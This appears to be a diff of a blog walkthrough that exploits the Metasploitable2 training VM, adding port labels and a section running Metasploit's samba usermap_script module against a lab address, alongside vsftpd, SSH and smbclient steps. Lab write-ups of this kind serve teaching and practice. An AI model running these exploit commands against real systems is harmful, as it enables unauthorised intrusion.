@@ -540,7 +540,7 @@ $(document).ready(
 </span><span class='line'>           Raw packets sent: 65555 (2.885MB) | Rcvd: 65552 (2.623MB)</span></code></pre></td></tr></table></div></figure>
 
 
-<h3>vsftpd exploit:</h3>
+<h3>vsftpd exploit (port 21):</h3>
 
 <p>search vsftpd</p>
 
@@ -572,7 +572,7 @@ $(document).ready(
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
 
-<h3>SSH exploit:</h3>
+<h3>SSH exploit (port 22):</h3>
 
 <p>Getting access to a system with a writeable filesystem</p>
 
@@ -644,6 +644,23 @@ $(document).ready(
 <p><code>smbclient //192.168.79.179/tmp</code></p>
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>since the samba version is 3.0.20, I found this module:</p>
+
+<p><code>exploit/multi/samba/usermap_script</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/samba/usermap_script
+</span><span class='line'>msf exploit(usermap_script) &gt; set rhost 192.168.79.179
+</span><span class='line'>msf exploit(usermap_script) &gt; exploit
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
 
 <h3>Unreal ircd exploit</h3>
 
